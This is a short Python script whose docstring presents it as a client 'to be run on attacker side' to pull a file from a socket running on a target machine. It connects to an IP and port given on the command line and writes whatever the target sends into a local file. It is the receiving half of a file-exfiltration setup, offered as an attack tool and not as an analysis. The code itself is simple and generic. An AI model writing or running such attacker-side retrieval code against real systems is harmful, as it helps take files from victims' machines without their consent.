import socket
import sys

'''
    Client program to be run on attacker side to retrieve file from Python socket running on target

'''

s = socket.socket()
client_ip = str(sys.argv[1])
client_port = int(sys.argv[2])
read_file = str(sys.argv[3])

s.connect((client_ip, client_port))
s.send(b"Collecting data and writing to file")

with open("{}".format(read_file), "wb") as f:
    print("Writing to: {}".format(read_file))
    while True:
        print("Receiving")
        data = s.recv(1024)
        print("data= ", data)
        if not data:
            break
        f.write(data)

f.close()
print("Recieved")
s.close()
print("Closed connection")
